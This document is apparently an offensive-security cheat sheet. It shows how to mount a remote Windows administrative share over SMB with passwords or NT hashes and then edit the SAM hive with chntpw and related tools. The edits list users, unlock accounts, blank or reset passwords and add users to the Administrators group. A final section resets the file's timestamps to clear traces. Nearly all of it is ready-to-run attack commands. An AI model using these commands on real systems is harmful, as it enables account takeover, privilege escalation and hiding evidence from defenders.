# Unix Shell

## 01 - Mount Remote SMB

TODO: Test it

Take note of the timestamps to clear traces ahead of time.

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ "allinfo /Windows/System32/config/SAM"

$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ "allinfo /Windows/System32/config/SAM"
```

Create a temporary folder for mounting an SMB share.

```
# mkdir /mnt/share
```

Mount SMB share with various authentication methods.

```
# mount -t cifs -o [domain=<domain>,]username=<username>,password=<password>,rw //<IP>/C$ /mnt/share

# smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw

# mount -t cifs -o [domain=<domain>,]username=<username>,password=<nt_hash>,sec=ntlmssp,rw //<IP>/C$ /mnt/share

# mount -t cifs -o sec=krb5,vers=3.0,rw '//<IP>/C$' /mnt/share
```

## 02 - Enumerate Users from SAM HIVE File

```
# chntpw -l /mnt/share/Windows/System32/config/SAM

# sampasswd -l /mnt/share/Windows/System32/config/SAM
```

Enumerate groups.

```
# samusrgrp -l /mnt/share/Windows/System32/config/SAM
```

Enumerate users with groups.

```
# samusrgrp -L /mnt/share/Windows/System32/config/SAM
```

Check any of the usernames are locked.

```
# samunlock -l /mnt/share/Windows/System32/config/SAM
```

## 03 - Unlock Users from SAM HIVE File

```
# samunlock -U -u <username> /mnt/share/Windows/System32/config/SAM
```

## 04 - Reset Password from SAM HIVE File

Interactive mode.

```
# chntpw -i /mnt/Windows/System32/config/SAM
chntpw version 1.00 140201, (c) Petter N Hagen
Hive </mnt/Windows/System32/config/SAM> name (from header): <\SystemRoot\System32\Config\SAM>
ROOT KEY at offset: 0x001020 * Subkey indexing type is: 686c <lh>
File size 65536 [10000] bytes, containing 7 pages (+ 1 headerpage)
Used for data: 318/31736 blocks/bytes, unused: 28/13096 blocks/bytes.



<>========<> chntpw Main Interactive Menu <>========<>

Loaded hives: </mnt/Windows/System32/config/SAM>

  1 - Edit user data and passwords
  2 - List groups
      - - -
  9 - Registry editor, now with full write support!
  q - Quit (you will be asked if there is something to save)


What to do? [1] -> 9
Simple registry editor. ? for help.

> ?
Simple registry editor:
hive [<n>]             - list loaded hives or switch to hive numer n
cd <key>               - change current key
ls | dir [<key>]       - show subkeys & values,
cat | type <value>     - show key value
dpi <value>            - show decoded DigitalProductId value
hex <value>            - hexdump of value data
ck [<keyname>]         - Show keys class data, if it has any
nk <keyname>           - add key
dk <keyname>           - delete key (must be empty)
ed <value>             - Edit value
nv <type#> <valuename> - Add value
dv <valuename>         - Delete value
delallv                - Delete all values in current key
rdel <keyname>         - Recursively delete key & subkeys
ek <filename> <prefix> <keyname>  - export key to <filename> (Windows .reg file format)
debug                  - enter buffer hexeditor
st [<hexaddr>]         - debug function: show struct info
q                      - quit

>
```

Specify local username to reset password.

```
# chntpw -u <username> /mnt/share/Windows/System32/config/SAM

Remove password from current username

Select: [q] > 1

Add username with administrator privileges.

Select: [q] > 3

Save changes

Select: [q] > q

Hives that have changed:
 #   Name
 0   <SAM>
Write hive files? (y/n) [n] : y
 0 <SAM> - OK
```

Even `sampasswd` will work as well.

```
# sampasswd -r -u <username> /mnt/share/Windows/System32/config/SAM
```

## 05 - Add Users in the group from SAM HIVE File

```
# samusrgrp -a -u <username> -g <group_ID> /mnt/share/Windows/System32/config/SAM
```

Append user in the users group.

```
# samusrgrp -a -u <username> -g 0x221 /mnt/share/Windows/System32/config/SAM
```

Append user in the administrators group.

```
# samusrgrp -a -u <username> -g 0x220 /mnt/share/Windows/System32/config/SAM
```

## 06 - Clear traces from SAM HIVE File

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ "utimes /Windows/System32/config/SAM [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss"

smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ "utimes /Windows/System32/config/SAM [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss [YY]YY:MM:DD-hh:mm:ss"
```

---
## References

- [Chntpw Source Repository](https://salsa.debian.org/debian/chntpw)

- [Kali.org Tools: Chntpw](https://www.kali.org/tools/chntpw/)